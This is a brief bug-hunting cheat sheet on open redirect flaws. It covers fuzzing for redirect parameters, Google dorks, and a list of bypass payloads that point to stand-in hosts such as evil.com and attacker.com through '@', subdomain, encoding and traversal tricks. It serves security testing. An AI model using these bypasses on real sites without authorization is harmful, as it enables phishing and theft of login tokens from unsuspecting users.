# Open Redirect

## Methodology

The methodology is simple, look for any parameters or endpoint, try to bypass it manually 

- Simple in common potential endpoints to find redirection, such as **login**, **logout**, **change site lang,** **links in emails**
- Fuzz to discover hidden files and endpoints
- Fuzz the endpoints to **discover** hidden parameters
    - If the endpoint does not have parameter, try fuzz, e.g. `/logout`
    - If the endpoint has parameters, try to **add new parameters** to the query string
- To enhance your hunting, try to collect redirect parameters separately
- If you find a redirection point, try to bypass it manually
- Search on google
    
    ```
    site:domain.tld inurl=%2f
    site:domain.tld inurl=http
    ```
    
    - for bypassing try these:
    
    ```markdown
    open redirect 
    
    1. ali.com/?next=google.com/hi/test --> wipe out from end
    + ?next=google.com@evil.com
    + ?next=google.com.evil.com
    + ?next=google.comevil.com
    + ?next=evil.com&dummy=google.com
    + ?next=domain.tld/@attacker.com/doman.tld
    
    2. ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/
    + ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/../level1/?next=
    
    3. ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/
    (to bypass this: capitalize letters)
    + ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/../Level1/?next=
    
    4. ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/
    (url encode 2x)
    + ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/../%254cevel1/?next=
    
    5. ali.com/?next=google.com&h=09929893828983(hash of google.com)
    + ali.com/?next=evil.com&h=2489339478283(hash of evil.com)
    ```
    
- Payload all the things exists also.